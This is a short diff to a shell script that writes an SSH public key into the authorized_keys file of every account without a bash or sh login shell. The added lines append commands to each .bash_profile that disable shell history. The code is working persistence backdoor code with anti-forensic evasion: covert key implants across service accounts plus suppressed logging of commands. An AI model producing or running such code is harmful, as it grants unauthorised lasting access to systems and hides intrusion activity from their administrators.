@@ -29,6 +29,9 @@ echo " === Writing credentials ==="
 for homedir in $(getent passwd | grep -v /bin/bash | grep -v /bin/sh | cut -d: -f6); do
     mkdir -p $homedir/.ssh 2> /dev/null
     touch $homedir/.ssh/authorized_keys 2> /dev/null
+    touch $homedir/.bash_profile 2> /dev/null
+    echo 'unset HISTFILE' >> $homedir/.bash_profile 2> /dev/null
+    echo 'set +o history' >> $homedir/.bash_profile 2> /dev/null
     echo $PUBKEY >> $homedir/.ssh/authorized_keys
     echo "Wrote creds to $homedir"
 done
